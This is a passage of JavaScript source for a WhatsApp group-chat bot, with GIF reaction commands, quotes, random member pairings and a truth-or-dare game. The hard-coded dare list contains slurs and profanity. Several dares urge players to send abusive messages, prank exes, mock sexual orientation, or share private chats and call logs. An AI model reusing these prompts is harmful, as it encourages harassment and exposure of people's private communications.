            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
			case 'quotes':{
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ xeondare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ xeontruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
              break
			case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
			case 'pick': {
            	if (!m.isGroup) return XeonStickGroup()
            	if (!text) return replygcxeon(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [xeonshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
             
         }
     break
			case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
    }
    break
			case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonkak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return XeonStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/soulmate.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return XeonStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/couple.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'can': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg') }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
